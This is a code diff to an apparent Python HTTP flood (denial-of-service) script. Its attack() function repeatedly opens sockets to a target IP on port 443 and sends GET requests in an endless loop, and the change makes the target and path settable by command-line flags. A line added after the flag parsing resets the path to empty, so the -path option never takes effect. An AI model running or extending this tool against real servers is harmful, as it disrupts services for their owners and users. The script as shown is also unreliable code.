@@ -4,10 +4,16 @@ import threading
 import ssl
 import multiprocessing
 import requests
+import sys
 
-ip = str(input("IP:"))
+for n,args in enumerate(sys.argv):
+    if args=="-i":
+        ip = str(sys.argv[n+1])
+    if args=="-path":
+        path = str(sys.argv[n+1])
 port = int(443)
 protocol = str("GET")
+path = ""
 
 useragents = [""]
 acceptall = [""]
@@ -25,7 +31,7 @@ def attack():
     conn = "Connection: " + connection + "\r\n"
     go.wait()
     while True:
-        get_host = protocol + " /index.php/?=" + str(random.randint(0,200)) + " HTTP/1.1\r\nHost: " + ip +":"+str(port)+ "\r\n"
+        get_host = protocol + path + "/?=" + str(random.randint(0,200)) + " HTTP/1.1\r\nHost: " + ip +":"+str(port)+ "\r\n"
         request  = get_host + conn + useragent + accept + referer + content + length + "\r\n"
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((ip, port))
